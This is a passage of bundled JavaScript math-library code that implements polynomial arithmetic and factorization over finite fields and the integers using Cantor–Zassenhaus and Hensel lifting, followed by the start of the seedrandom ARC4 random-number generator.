    var remainderDegree = remainder.length - 1;
    var quotient = new Array(a.length - b.length + 1);
    var zero = lc - lc;
    for (var i = 0; i < quotient.length; i++) {
      quotient[i] = zero;
    }
    while (remainderDegree >= b.length - 1) {
      var n = remainderDegree - b.length + 1;
      var q = modulo(remainder[remainderDegree], m);
      quotient[n] = q;
      if (q != 0) {
        if (q == 1) {
          for (var j = 0; j < b.length; j += 1) {
            remainder[j + n] -= b[j];
          }
        } else {
          for (var j = 0; j < b.length; j += 1) {
            remainder[j + n] -= q * b[j];
          }
        }
      }
      while (remainderDegree >= 0 && modulo(remainder[remainderDegree], m) == 0) {
        remainder[remainderDegree] = zero;
        remainderDegree -= 1;
      }
    }
    for (var j = 0; j <= remainderDegree; j += 1) {
      remainder[j] = modulo(remainder[j], m);
    }
    return {quotient: new IntPolynomial(quotient), remainder: new IntPolynomial(remainder)};
  };
  IntPolynomial.prototype.negate = function (s) {
    return new IntPolynomial(this.coefficients.map(function (c) { return (c - c) - c; }));
  };
  IntPolynomial.prototype.scale = function (s) {
    return new IntPolynomial(this.coefficients.map(function (c) { return c * s; }));
  };
  IntPolynomial.prototype.getDegree = function () {
    return this.coefficients.length - 1;
  };
  IntPolynomial.prototype.getLeadingCoefficient = function () {
    if (this.coefficients.length === 0) {
      throw new RangeError();
    }
    return this.coefficients[this.coefficients.length - 1];
  };
  IntPolynomial.prototype.getCoefficient = function (degree) {
    if (degree >= this.coefficients.length) {
      throw new RangeError();
    }
    return this.coefficients[degree];
  };
  IntPolynomial.prototype.derive = function (p) {
    var c = new Array(this.coefficients.length - 1);
    for (var i = 0; i < c.length; i += 1) {
      c[i] = (i + 1) * this.coefficients[i + 1];
    }
    return new IntPolynomial(c);
  };
  IntPolynomial.prototype.mod = function (p) {
    return new IntPolynomial(this.coefficients.map(function (c) { return modulo(c, p); }));
  };
  IntPolynomial.prototype.toString = function () {
    var s = '';
    var c = this.coefficients;
    for (var i = c.length - 1; i >= 0; i--) {
      s += (c[i] >= 0 && i !== c.length ? '+' : '');
      s += c[i].toString();
      if (i === 1) {
        s += 'x';
      } else if (i !== 0) {
        s += 'x^';
        s += i;
      }
    }
    return s;
  };
  IntPolynomial.from = function (coefficients) {
    return new IntPolynomial(coefficients);
  };

self.IntPolynomial = IntPolynomial;

})();
(function () {
"use strict";





//?

function toInt(c, p) {
  if (p instanceof Expression.Integer) {
    return Expression.Integer.fromBigInt(c);
  }
  return c;
}

function fromInt(c) {
  if (c instanceof Expression.Integer) {
    return c;
  }
  return Expression.Integer.fromBigInt(c);
}

function toIntPolynomial(f, p) {
  if (p instanceof Expression.Integer) {
    return f.mod(p);
  }
  var ep = Expression.Integer.fromBigInt(p);
  var coefficients = new Array(f.getDegree() + 1);
  for (var i = 0; i < coefficients.length; i += 1) {
    coefficients[i] = f.getCoefficient(i).modulo(ep).toBigInt();
  }
  return IntPolynomial.from(coefficients);
}

function fromIntPolynomial(f) {
  var coefficients = new Array(f.getDegree() + 1);
  for (var i = 0; i < coefficients.length; i += 1) {
    coefficients[i] = Expression.Integer.fromBigInt(f.getCoefficient(i));
  }
  return Polynomial.from(coefficients);
}

// Books:
// Henri Cohen "A Course in Computational Algebraic Number Theory"
// "Computer algebra and symbolic computation Mathematical Methods" Joel S. Cohen
// "The art of computer programming. Vol.2: Seminumerical algorithms" Donald E. Knuth
// https://en.wikipedia.org/wiki/Finite_field
// https://en.wikipedia.org/wiki/Factorization_of_polynomials_over_finite_fields
// https://en.wikipedia.org/wiki/Factorization_of_polynomials#Factoring_univariate_polynomials_over_the_integers


var isPrime = primeFactor._isPrime;

function ExtendedEuclideanAlgorithm(A, B, p) {
  // U * A + V * B = gcd(A, B) (mod p)
  A = A.mod(p);
  B = B.mod(p);
  // https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm#Pseudocode
  var $newold_r = A; var $newr =  B; var old_r = $newold_r; var r = $newr;
  var ZERO = Polynomial.of(Expression.ZERO);
  var ONE = Polynomial.of(p.divide(p));//TODO: ?
  var $newold_s = ONE; var $news =  ZERO; var old_s = $newold_s; var s = $news;
  var $newold_t = ZERO; var $newt =  ONE; var old_t = $newold_t; var t = $newt;
  while (r.getDegree() >= 0) {
    var multiplier = r.getLeadingCoefficient().modInverse(p);
    var tmp = old_r.scale(multiplier).mod(p).divideAndRemainderModP(r.scale(multiplier).mod(p), p);
    var quotient = tmp.quotient;
    //var $newold_r = r; var $newr =  old_r.subtract(quotient.multiply(r)).mod(p); old_r = $newold_r; r = $newr;
    var $newold_r = r; var $newr =  tmp.remainder.scale(r.getLeadingCoefficient()).mod(p); old_r = $newold_r; r = $newr;
    var $newold_s = s; var $news =  old_s.subtract(quotient.multiply(s)).mod(p); old_s = $newold_s; s = $news;
    var $newold_t = t; var $newt =  old_t.subtract(quotient.multiply(t)).mod(p); old_t = $newold_t; t = $newt;
  }
  var k = old_r.getLeadingCoefficient().modInverse(p);
  var gcd = old_r.scale(k).mod(p);
  var U = old_s.scale(k).mod(p);
  var V = old_t.scale(k).mod(p);
  return {
    U: U,
    V: V,
    gcd: gcd
  };
}

// https://en.wikipedia.org/wiki/Factorization_of_polynomials_over_finite_fields#Equal-degree_factorization

function modPow(polynomial, n, m, q) {
  var p = polynomial;
  var accumulator = null;
  while (!n.equals(Expression.ZERO)) {
    if (!n.remainder(Expression.TWO).equals(Expression.ZERO)) {
      n = n.subtract(Expression.ONE);
      if (accumulator == null) {
        accumulator = p;
      } else {
        accumulator = accumulator.multiply(p).mod(q).divideAndRemainderModP(m, q).remainder;
      }
    } else {
      n = n.truncatingDivide(Expression.TWO);
      p = p.multiply(p).mod(q).divideAndRemainderModP(m, q).remainder;
    }
  }
  return accumulator;
}

function distinctDegreeFactorization(f, p) {
  f = f.mod(p);
  // copy-paste of pseudo code from Wikipedia - https://en.wikipedia.org/wiki/Factorization_of_polynomials_over_finite_fields#Distinct-degree_factorization
  var i = 1;
  var S = [];
  var fStar = f;
  fStar = toMonic(fStar, p);
  var q = p;
  var x = f.constructor.from([toInt(0, p), toInt(1, p)]);//TODO: ?
  var xInQInI = modPow(x, fromInt(q), fStar, q); // x**(q**i)
  while (fStar.getDegree() >= 2 * i) {
    //TODO: see the Wikipedia page for some optimizations - ?
    var h = xInQInI.subtract(x).divideAndRemainderModP(fStar, q).remainder;
    var g = gcdOfPolynomialsOverFiniteField(fStar, h, q);
    if (g.getDegree() !== 0) {
      S.push({factor: g, degree: i});
      fStar = fStar.divideAndRemainderModP(g, q).quotient;
    }
    i = i + 1;
    xInQInI = modPow(xInQInI, fromInt(q), fStar, q);
  }
  if (fStar.getDegree() > 0) {
    S.push({factor: fStar, degree: fStar.getDegree()});
  }
  if (S.length === 0) {
    S.push({factor: f, degree: 1});
  }
  return S;
}

function randomBigInt0(size, random) {
random = random == undefined ?  Math.random : random;

  console.assert(Math.floor(size) === size);
  if (size <= 52) {
    return Math.floor(random() * Math.pow(2, size));
  }
  var q = Math.ceil(size / (2 * 52)) * 52;
  return (BigInt(randomBigInt0(size - q, random)) << BigInt(q)) + BigInt(randomBigInt0(q, random));
}

// [0; max - 1]
function randomBigInt(max, random) {
random = random == undefined ?  Math.random : random;

  if (Number(max) <= Math.pow(2, 52)) {
    return Math.floor(random() * Number(max));
  }
  var size = Expression.Integer.fromBigInt(max).bitLength();
  return (BigInt(randomBigInt0(size, random)) * BigInt(max)) >> BigInt(size);
}

function CantorZassenhausAlgorithm(f, p, factorsDegree) {
  f = f.mod(p);
  f = toMonic(f, p);//TODO: is it needed here, test - ?
  // copy-paste of pseudo code from Wikipedia - https://en.wikipedia.org/wiki/Factorization_of_polynomials_over_finite_fields#Cantorâ€“Zassenhaus_algorithm
  var n = f.getDegree();
  var d = factorsDegree;
  var r = n / d;
  var q = p;
  var Factors = [];
  Factors.push(f);
  var random = Math.seedrandom != null ? new Math.seedrandom('hello.') : Math.random;
  while (Factors.length < r) {
    var h = f.constructor.from(new Array(n).fill(q).map(function (q) { return toInt(randomBigInt(fromInt(q).toBigInt(), random), q); }));
    var ONE = f.constructor.from([toInt(1, p)]);
    var qInDminusOneOverTwo = (fromInt(q)._pow(d).subtract(Expression.ONE)).truncatingDivide(Expression.TWO);
    var g = modPow(h, qInDminusOneOverTwo, f, q).subtract(ONE).divideAndRemainderModP(f, q).remainder;
    var updatedFactors = [];
    for (var iteratoru = Factors[globalThis.Symbol.iterator](), u = iteratoru.next().value; u != null; u = iteratoru.next().value) {
      var gcd = gcdOfPolynomialsOverFiniteField(g, u, q);
      if (gcd.getDegree() !== 0 && gcd.getDegree() !== u.getDegree()) {
        updatedFactors.push(gcd);
        updatedFactors.push(u.divideAndRemainderModP(gcd, q).quotient);
      } else {
        updatedFactors.push(u);
      }
    }
    Factors = updatedFactors;
  }
  return Factors;
}

function factorizeOverTheFiniteField(f, p) {
  if (!isFactorizationOverZpSquareFree(f, p)) {
    throw new RangeError("implemented only for square-free polynomials");
  }
  var factorization = [];
  var distinctDegreeFactors = distinctDegreeFactorization(f, p);
  for (var iteratorddf = distinctDegreeFactors[globalThis.Symbol.iterator](), ddf = iteratorddf.next().value; ddf != null; ddf = iteratorddf.next().value) {
    var equalDegreeFactors = CantorZassenhausAlgorithm(ddf.factor, p, ddf.degree);
    factorization = factorization.concat(equalDegreeFactors);
  }
  return factorization;
}

function toMonic(f, p) {
  if (f.getDegree() < 0) {
    return f;
  }
  var scale = toInt(fromInt(f.getLeadingCoefficient()).modInverse(fromInt(p)).toBigInt(), p);
  return f.scale(scale).mod(p);
}



function gcdOfPolynomialsOverFiniteField(a, b, p) {
  a = a.mod(p);//?
  b = b.mod(p);//?
  b = toMonic(b, p);
  while (b.getDegree() >= 0) {
    var r = a.divideAndRemainderModP(b, p).remainder;
    r = toMonic(r, p);
    a = b;
    b = r;
  }
  return a;
}

function _gcdOfPolynomialsOverFiniteField0(a, b, p) {
  return fromIntPolynomial(gcdOfPolynomialsOverFiniteField(toIntPolynomial(a, p), toIntPolynomial(b, p), p));
}

function isFactorizationOverZpSquareFree(u, prime) {
  var f = u;
  return gcdOfPolynomialsOverFiniteField(f, f.derive().mod(prime), prime).getDegree() === 0;
}

// The art of computer programming. Vol.2: Seminumerical algorithms, page 452
function factorizeOverTheIntegers(u, useHenselLifting) {
useHenselLifting = useHenselLifting == undefined ?  true : useHenselLifting;

  //if (u.toString() === '1471566513477172834305399948590466009*x^36-211905577940712888139977592597027105296*x^34+13129986163287865167531292496146540399224*x^32-462939766422599809806997255332437328597216*x^30+10362430845905260438547837088962342900036976*x^28-155683443407207896942716489327940147108629120*x^26+1618556951246037407274416866201451391464784384*x^24-11830632228190604908249839266002717097001139200*x^22+61153871177545784578882242689870006264757876480*x^20-223152626999418063421149667823603202136231649280*x^18+570260219818484251015463882930738160317054441472*x^16-1007187648191427638267502108195308402754856378368*x^14+1207581236321353649337451225242701250021029548032*x^12-959457354479765675976827753329438931015039090688*x^10+487489052553389695914981886297548193964734087168*x^8-149263610192452471565789533727206449715567656960*x^6+24608195620710414500859286809189277514021732352*x^4-1679911046068335257837067359574057455871590400*x^2+13348232781789541344412108782227014287360000') debugger;
  var polynomial = u;
  if (u.getCoefficient(0).equals(Expression.ZERO)) {
    return Polynomial.of(Expression.ZERO, Expression.ONE);
  }
  if (u.getCoefficient(0).abs().bitLength() - u.getLeadingCoefficient().abs().bitLength() < -50) {//?
    var factor = factorizeOverTheIntegers(u._exponentiateRoots(-1), useHenselLifting);
    return factor == null ? null : factor._exponentiateRoots(-1);
  }
  var checkBothVariants = true;
  var getBound = function (p) {
    if (checkBothVariants) {
      return Math.min(p._log2OfBoundForCoefficientsOfFactor(Math.floor(p.getDegree() / 2), p.getLeadingCoefficient().abs()),
                      p._log2OfBoundForCoefficientsOfFactor(p.getDegree(), p.getLeadingCoefficient().abs()._integerNthRoot(2)));
    }
    return p._log2OfBoundForCoefficientsOfFactor(p.getDegree(), p.getLeadingCoefficient().abs());
  };
  var B = Math.min(getBound(u), getBound(u._exponentiateRoots(-1)));//TODO: REMOVE

  var prime = 0;
  var nextGoodPrime = function (integer) {
    var p = integer;
    var pp = p;
    do {
      do {
        p = Expression.Integer.fromBigInt(p).add(Expression.TWO).toBigInt();
      } while (!isPrime(p));
      if (!useHenselLifting) {
        pp = Expression.Integer.fromBigInt(p);
      } else {
        pp = p;
      }
    } while (u.getLeadingCoefficient().remainder(Expression.Integer.fromBigInt(p)).equals(Expression.ZERO) || !isFactorizationOverZpSquareFree(toIntPolynomial(u, pp), pp));
    return pp;
  };
  var log2 = function (b) {
    //TODO: ?
    var e = b.bitLength();
    return Math.log2(b.truncatingDivide(Expression.TWO._pow(Math.max(0, e - 53))).toNumber()) + Math.max(0, e - 53);
  };
  //var useHenselLifting = true;//TODO: ?
  if (!useHenselLifting) {
    prime = nextGoodPrime(Expression.TWO._pow(Math.ceil(1 + log2(u.getLeadingCoefficient().abs()) + B)).add(Expression.ONE).toBigInt());
  } else {
    prime = nextGoodPrime(1);
  }
  var tryMultiplePrimes = !useHenselLifting ? 0 : 2;
  if (tryMultiplePrimes !== 0) {
    var best = prime;
    var bestFactorsNumber = 1 / 0;
    for (var tries = 0; tries < tryMultiplePrimes; tries += 1) {
      var factorsNumber = 0;
      var ddfs = distinctDegreeFactorization(toIntPolynomial(u, prime), prime);
      for (var iteratorentry = ddfs[globalThis.Symbol.iterator](), entry = iteratorentry.next().value; entry != null; entry = iteratorentry.next().value) {
        factorsNumber += (entry.factor.getDegree() / entry.degree);
      }
      if (bestFactorsNumber > factorsNumber) {
        best = prime;
        bestFactorsNumber = factorsNumber;
      }
      prime = nextGoodPrime(prime);
    }
    prime = best;
  }
  var factors = factorizeOverTheFiniteField(toIntPolynomial(u, prime), prime).map(function (factor) { return useHenselLifting ? fromIntPolynomial(factor) : factor; });
  
  if (u.isEven() && factors.length > 3) { // https://math.stackexchange.com/a/2894104
    var f = factorizeOverTheIntegers(u._exponentiateRoots(2));
    if (f != null) {
      return f._exponentiateRoots(1 / 2);
    }
    // see below
  }

  var q = 0;
  if (useHenselLifting) {
    var e = Math.ceil((1 + log2(u.getLeadingCoefficient().abs()) + B) / Math.log2(prime));
    //if (useQuadraticHenselLift) {
    //  e = Math.pow(2, Math.ceil(Math.log2(e)));
    //}
    var p = Expression.Integer.fromNumber(prime);
    factors[factors.length - 1] = factors[factors.length - 1].scale(u.getLeadingCoefficient().modulo(p)).mod(p);
    factors = HenselLifting(u, factors, p, e);
    q = p._pow(e);
    factors = factors.map(function (factor) { return factor.scale(factor.getLeadingCoefficient().modulo(q).modInverse(q)).mod(q); });//TODO: ?
  } else {
    q = prime;
  }
  
  //!new 2022-07-27
  if (u.isEven() && factors.length > 3) { // https://math.stackexchange.com/a/2894104
    // see above
    for (var i = 0; i < factors.length; i += 1) {
      if (factors[i] != null) {
        var f1 = factors[i].mod(q);
        var f2 = factors[i]._scaleRoots(Expression.ONE.negate()).mod(q);
        var found = false;
        for (var j = i + 1; j < factors.length && !found; j += 1) {
          if (factors[j] != null && factors[j].mod(q).equals(f2)) {
            factors[j] = null;
            found = true;
          }
        }
        if (!found) {
          //debugger;
          return null;
        }
      }
    }
    factors = factors.filter(function (f) { return f != null; });
    for (var i = 0; i < Math.pow(2, factors.length - 1); i += 1) {
      var candidate = productModQ(factors.map(function (f, index) { return Math.floor(i / Math.pow(2, index)) % 2 === 0 ? f : f._scaleRoots(Expression.ONE.negate()); }), q).scale(u.getLeadingCoefficient()).mod2(q).primitivePart();
      var tmp = u.divideAndRemainder(candidate, "undefined");
      if (tmp != undefined && tmp.remainder.getDegree() < 0) {
        return candidate;
      }
    }
    return null;
  }

  //!!! (number of factors depends on the choise of prime numbers)
  //TODO: how to reduce number of iterations (?) (see Donald Knuth's book)
  var c = 0;
  for (var countOfFactors = 1; countOfFactors <= (checkBothVariants ? factors.length - 1 : Math.floor(factors.length / 2)); countOfFactors += 1) {
    var combinationsIterator = combinations(factors, countOfFactors);
    var combination = null;
    while ((combination = combinationsIterator.next().value) != null) {
      c += 1;
      var lc = u.getLeadingCoefficient();
      // an optimization from the Donald Knuth's book, page 452
      var productTrailingCoefficient = lc;
      for (var iteratorf = combination[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
        productTrailingCoefficient = productTrailingCoefficient.multiply(f.getCoefficient(0)).modulo(q);
      }
      productTrailingCoefficient = Polynomial.of(productTrailingCoefficient).mod2(q).getCoefficient(0);
      if (u.getCoefficient(0).multiply(lc).remainder(productTrailingCoefficient).equals(Expression.ZERO)) {
        var v = productModQ(combination, q);
        console.assert(v.getLeadingCoefficient().equals(Expression.ONE));
        v = v.scale(lc);
        v = v.mod2(q);
        //TODO: test, we need to try w(x) = productModQ(factors.filter(function (factor) { return combination.indexOf(factor) === -1; }), q) as well (see Donald Knuth's book) - ?
        console.assert(v.getDegree() < u.getDegree());
        //if (v.getDegree() <= u.getDegree() / 2 || v.getDegree() < u.getDegree()) {
          //v = v.primitivePart();
          var tmp = u.scale(lc).divideAndRemainder(v, "undefined");
          if (tmp != undefined && tmp.remainder.getDegree() < 0) {
            v = v.primitivePart();
            factors = factors.filter(function (factor) { return combination.indexOf(factor) === -1; });
            combinationsIterator = combinations(factors, countOfFactors);//!?
            u = tmp.quotient;
            return v;
          }
        //}
      }
    }
  }
if (c > 16) {
  console.debug(c);
}
  if (polynomial.subtract(u).getDegree() >= 0) {
    u = u.primitivePart();//?
    return u;
  }
  return null;
}

// if q == p, then C = A * B (mod p) -> A1 * B1 (mod p**2), A1 = A (mod p) and B1 = B (mod p)
function HenselLift(C, A, B, U, V, q, p) { // q -> q * p
  // C = A * B mod p
  /*
  // https://www.csd.uwo.ca/~mmorenom/CS874/Lectures/Newton2Hensel.html/node17.html#eq:FactorizationLiftingProblem
  //C = C.map(function (c) { return new IntegerModuloPrimeNumber(c, Expression.Integer.fromBigInt(p**2)); })
  //TODO: ?
  var e = C.subtract(A.multiply(B));
  var A1 = A.add(U.multiply(e));
  var B1 = B.add(V.multiply(e));
  return {A1: A1, B1: B1};
  */
  // http://tomlr.free.fr/Math%E9matiques/Math%20Complete/Number%20theory/A%20course%20in%20computational%20algebraic%20number%20theory%20-%20Cohen%20H..pdf
  // Algorithm 3.5.5 (Hensel Lift).
  // A,B,C are polynomials over Integers:
  //console.assert(A.hasIntegerCoefficients());
  //console.assert(B.hasIntegerCoefficients());
  //console.assert(C.hasIntegerCoefficients());
  console.assert(q.isDivisibleBy(p));
  //C = C.mod(q.multiply(p));//TODO: ???
  var f = C.subtract(A.multiply(B)).scale(q.inverse()).mod(p);
  var tmp = V.multiply(f).mod(p).divideAndRemainderModP(A.mod(p), p);
  var t = tmp.quotient;
  //var A0 = V.multiply(f).subtract(A.multiply(t)).mod(p);
  var A0 = tmp.remainder;
  var B0 = U.multiply(f).add(B.mod(p).multiply(t)).mod(p);
  var A1 = A.add(A0.scale(q));
  var B1 = B.add(B0.scale(q));
  return [A1.mod(q.multiply(p)), B1.mod(q.multiply(p))];
}
function QuadraticHenselLift(A1, B1, U, V, p) {
  // http://tomlr.free.fr/Math%E9matiques/Math%20Complete/Number%20theory/A%20course%20in%20computational%20algebraic%20number%20theory%20-%20Cohen%20H..pdf
  // Algorithm 3.5.6 
  var one = p.divide(p);
  var g = Polynomial.of(one).subtract(U.multiply(A1)).subtract(V.multiply(B1)).scale(p.inverse()).mod(p);
  var tmp = V.multiply(g).mod(p).divideAndRemainderModP(A1.mod(p), p);
  var t = tmp.quotient;
  var U0 = U.multiply(g).add(B1.mod(p).multiply(t)).mod(p);
  //var V0 = V.multiply(g).subtract(A1.multiply(t)).mod(p);
  var V0 = tmp.remainder;
  var U1 = U.add(U0.scale(p));
  var V1 = V.add(V0.scale(p));
  return [U1.mod(p.multiply(p)), V1.mod(p.multiply(p))];
}
function HenselLiftingOfTwoFactors(C, A, B, p, k) {
  var useQuadraticHenselLift = true;
  var tmp1 = ExtendedEuclideanAlgorithm(A, B, p);
  console.assert(tmp1.gcd.getDegree() === 0);
  var U = tmp1.U;
  var V = tmp1.V;
  var ok = !(p instanceof Expression.Polynomial); // somehow the quadratic hensel lifting is slower in other case
  if (useQuadraticHenselLift && ok) { // TODO: any degree
    var originalP = p;
    var e = 1;
    while (e < k / 2) {
      var $tmpA_B = HenselLift(C, A, B, U, V, p, p); A = $tmpA_B[0]; B = $tmpA_B[1];
      var $tmpU_V = QuadraticHenselLift(A, B, U, V, p); U = $tmpU_V[0]; V = $tmpU_V[1];
      p = p.multiply(p);
      e *= 2;
      if (true) {
        var c = 1;
        while (e * c < k) {
          c *= 2;
        }
        if ((e - 1) * c >= k) {
          e -= 1;
          p = p.divide(originalP);
        }
      }
    }
    var $tmpA_B = HenselLift(C, A, B, U, V, p, p); A = $tmpA_B[0]; B = $tmpA_B[1];
    //p = p.multiply(p);
    e *= 2;
    if (e !== k) {
      var pInK = originalP._pow(k);
      A = A.mod(pInK);
      B = B.mod(pInK);
    }
    return [A, B];
  }
  //TODO: ?
  var q = p;
  for (var i = 1; i < k; i += 1) {
    var $tmpA_B = HenselLift(C, A, B, U, V, q, p); A = $tmpA_B[0]; B = $tmpA_B[1];
    //console.assert(U.multiply(A).add(V.multiply(B)).mod(p).toString() === '1');
    q = q.multiply(p);
  }
  return [A, B];
}
function productModQ(factors, q) {
  console.assert(factors.length > 0);
  return factors.length > 1 ? productModQ(factors.slice(0, Math.ceil(factors.length / 2)), q).multiply(productModQ(factors.slice(Math.ceil(factors.length / 2)), q)).mod(q) : factors[0];
}
function HenselLifting(C, factors, p, e) {
  // https://scholar.rose-hulman.edu/cgi/viewcontent.cgi?article=1163&context=math_mstr
  // "2.3 Factoring mod p e: Hensel Lifting"
  if (factors.length === 1) {
    return [C];
  }
  // divide and conquer
  var s = Math.ceil(factors.length / 2);
  var A = factors.slice(0, s);
  var B = factors.slice(s);
  var $tmpA1_B1 = HenselLiftingOfTwoFactors(C, productModQ(A, p), productModQ(B, p), p, e); var A1 = $tmpA1_B1[0]; var B1 = $tmpA1_B1[1];
  return HenselLifting(A1, A, p, e).concat(HenselLifting(B1, B, p, e));
}

factorizeOverTheIntegers._gcdOfPolynomialsOverFiniteField0 = _gcdOfPolynomialsOverFiniteField0; //TODO: ?

function factorizeMultivariateIntegerPolynomial(p) {
  // see "Art of Computer Programming, Volume 2: Seminumerical Algorithms"
  function factorizeInternal(p) {//TODO: REMOVE
    var factors = [];
    p = p.primitivePart();
    var f = p.getDegree() > 1 ? (!p.hasIntegerCoefficients() ? p.factorize() : factorizeOverTheIntegers(p)) : null;//TODO: ?
    if (f != null) {
      factors = factors.concat(factorizeInternal(f));
      factors = factors.concat(factorizeInternal(p.divideAndRemainder(f, "throw").quotient));
    } else {
      factors.push(p);
    }
    return factors;
  }
  var degreeByY = 0;
  for (var i = 0; i <= p.getDegree(); i += 1) {
    if (!(p.getCoefficient(i).equals(Expression.ZERO))) {
      degreeByY = Math.max(degreeByY, p.getCoefficient(i).polynomial.getDegree());
    }
  }
  //if (degreeByY > p.getDegree()) {
  //  return toPolynomialByAnotherVar(factorizeMultivariateIntegerPolynomial(toPolynomialByAnotherVar(p)));
  //}
  //degreeByY = Math.pow(2, Math.ceil(Math.log2(degreeByY + 1))) - 1;//!?
  for (var y = 0;; y += 1) {
    var p_r = p.map(function (c) { return c.polynomial.calcAt(Expression.Integer.fromNumber(y)); });
    if (p_r.getDegree() === p.getDegree() && p_r.isSquareFreePolynomial()) {
      var factors = Array.from(factorizeInternal(p_r)).map(function (f) { return f.map(function (c) { return new Expression.Polynomial(Polynomial.of(c)); }); });
      if (factors.length < 2) {
        return null; // primitive (?)
      }
      var s = new Expression.Polynomial(Polynomial.of(p_r.getContent()));
      factors[factors.length - 1] = factors[factors.length - 1].scale(s);
      var r = new Expression.Polynomial(Polynomial.of(Expression.Integer.fromNumber(0 - y), Expression.ONE));
      var q = r._pow(degreeByY + 1);
      factors = HenselLifting(p, factors, r, degreeByY + 1);
      console.assert(p.subtract(productModQ(factors, q)).mod(q).toString() === '0');
      for (var number = 1; number <= factors.length - 1; number += 1) {
        for (var iteratorc = combinations(factors, number)[globalThis.Symbol.iterator](), c = iteratorc.next().value; c != null; c = iteratorc.next().value) {
          var candidate = productModQ(c, q);
          candidate = candidate.scale(p.getLeadingCoefficient()).mod(q);
          if (candidate._hasIntegerLikeCoefficients()) {
            candidate = candidate.primitivePart();
            if (p.scale(p.getLeadingCoefficient()._pow(p.getDegree() - candidate.getDegree() + 1)).isDivisibleBy(candidate)) {
              return candidate;
            }
          }
        }
      }
    }
  }
}

factorizeOverTheIntegers._factorizeMultivariateIntegerPolynomial = factorizeMultivariateIntegerPolynomial;

self.factorizeOverTheIntegers = factorizeOverTheIntegers;

factorizeOverTheIntegers.testables = {
  gcdOfPolynomialsOverFiniteField: gcdOfPolynomialsOverFiniteField,
  distinctDegreeFactorization: distinctDegreeFactorization,
  CantorZassenhausAlgorithm: CantorZassenhausAlgorithm,
  isFactorizationOverZpSquareFree: isFactorizationOverZpSquareFree,
  factorizeOverTheFiniteField: factorizeOverTheFiniteField,
  modPow: modPow,

  randomBigInt: randomBigInt,

  ExtendedEuclideanAlgorithm: ExtendedEuclideanAlgorithm,
  HenselLift: HenselLift,
  QuadraticHenselLift: QuadraticHenselLift,
  HenselLiftingOfTwoFactors: HenselLiftingOfTwoFactors,
  HenselLifting: HenselLifting,
  productModQ: productModQ
};

})();
(function () {
"use strict";
/*
Copyright 2019 David Bau.

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

*/

(function (global, pool, math) {
//
// The following constants are related to IEEE 754 limits.
//

var width = 256,        // each RC4 output is 0 <= x < 256
    chunks = 6,         // at least six RC4 outputs for each double
    digits = 52,        // there are 52 significant digits in a double
    rngname = 'random', // rngname: name for Math.random and Math.seedrandom
    startdenom = math.pow(width, chunks),
    significance = math.pow(2, digits),
    overflow = significance * 2,
    mask = width - 1,
    nodecrypto;         // node.js crypto module, initialized at the bottom.

//
// seedrandom()
// This is the seedrandom function described above.
//
function seedrandom(seed, options, callback) {
  var key = [];
  options = (options == true) ? { entropy: true } : (options || {});

  // Flatten the seed string or build one from local entropy if needed.
  var shortseed = mixkey(flatten(
    options.entropy ? [seed, tostring(pool)] :
    (seed == null) ? autoseed() : seed, 3), key);

  // Use the seed to initialize an ARC4 generator.
  var arc4 = new ARC4(key);

  // This function returns a random double in [0, 1) that contains
  // randomness in every bit of the mantissa of the IEEE 754 value.
  var prng = function() {
    var n = arc4.g(chunks),             // Start with a numerator n < 2 ^ 48
        d = startdenom,                 //   and denominator d = 2 ^ 48.
        x = 0;                          //   and no 'extra last byte'.
    while (n < significance) {          // Fill up all significant digits by
      n = (n + x) * width;              //   shifting numerator and
      d *= width;                       //   denominator and generating a
      x = arc4.g(1);                    //   new least-significant-byte.
    }
    while (n >= overflow) {             // To avoid rounding up, before adding
      n /= 2;                           //   last byte, shift everything
      d /= 2;                           //   right using integer math until
      x >>>= 1;                         //   we have exactly the desired bits.
    }
    return (n + x) / d;                 // Form the number within [0, 1).
  };

  prng.int32 = function() { return arc4.g(4) | 0; }
  prng.quick = function() { return arc4.g(4) / 0x100000000; }
  prng.double = prng;

  // Mix the randomness into accumulated entropy.
  mixkey(tostring(arc4.S), pool);

  // Calling convention: what to return as a function of prng, seed, is_math.
  return (options.pass || callback ||
      function(prng, seed, is_math_call, state) {
        if (state) {
          // Load the arc4 state from the given state if it has an S array.
          if (state.S) { copy(state, arc4); }
          // Only provide the .state method if requested via options.state.
          prng.state = function() { return copy(arc4, {}); }
        }

        // If called as a method of Math (Math.seedrandom()), mutate
        // Math.random because that is how seedrandom.js has worked since v1.0.
        if (is_math_call) { math[rngname] = prng; return seed; }

        // Otherwise, it is a newer calling convention, so return the
        // prng directly.
        else return prng;
      })(
  prng,
  shortseed,
  'global' in options ? options.global : (this == math),
  options.state);
}

//
// ARC4
//
// An ARC4 implementation.  The constructor takes a key in the form of
// an array of at most (width) integers that should be 0 <= x < (width).
//
// The g(count) method returns a pseudorandom integer that concatenates
// the next (count) outputs from ARC4.  Its return value is a number x
// that is in the range 0 <= x < (width ^ count).
//
function ARC4(key) {
  var t, keylen = key.length,
      me = this, i = 0, j = me.i = me.j = 0, s = me.S = [];

  // The empty key [] is treated as [0].
  if (!keylen) { key = [keylen++]; }

  // Set up S using the standard key scheduling algorithm.
  while (i < width) {
    s[i] = i++;
  }
  for (i = 0; i < width; i++) {
    s[i] = s[j = mask & (j + key[i % keylen] + (t = s[i]))];
    s[j] = t;
  }

  // The "g" method returns the next (count) outputs as one number.
  (me.g = function(count) {
    // Using instance members instead of closure state nearly doubles speed.
    var t, r = 0,
        i = me.i, j = me.j, s = me.S;
    while (count--) {
      t = s[i = mask & (i + 1)];
      r = r * width + s[mask & ((s[i] = s[j = mask & (j + t)]) + (s[j] = t))];
    }
